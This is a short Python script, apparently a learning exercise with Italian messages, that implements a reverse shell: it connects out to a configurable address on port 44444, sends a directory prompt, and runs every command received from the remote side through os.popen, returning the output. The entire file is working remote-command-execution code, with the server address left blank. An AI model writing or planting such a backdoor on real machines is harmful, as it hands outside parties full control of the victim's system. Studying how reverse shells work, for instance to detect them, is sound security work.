import socket as so
import os
# https://docs.python.org/
# https://docs.python.org/3/library/socket.html#module-socket


SRV_ADDR = ""
SRV_PORT = 44444

s = so.socket(so.AF_INET, so.SOCK_STREAM)
s.connect((SRV_ADDR, SRV_PORT))
print(f'Connected to: {SRV_ADDR}:{SRV_PORT}')

while True:
    output = os.popen("pwd").read().rstrip() + " $ "
    s.sendall(output.encode("utf-8"))
    data = s.recv(1024)
    if not data: break
    cmd = data.decode("utf-8").rstrip()
    if cmd == "help":
        s.sendall("Esegui qualsiasi comando\n".encode('utf-8'))
    elif cmd == "ciao":
        s.sendall(b"Come stai?\n")
    else:
        output = os.popen(cmd).read() + "\n"
        s.sendall(output.encode('utf-8'))
    print(data.decode("utf-8"))
s.close()
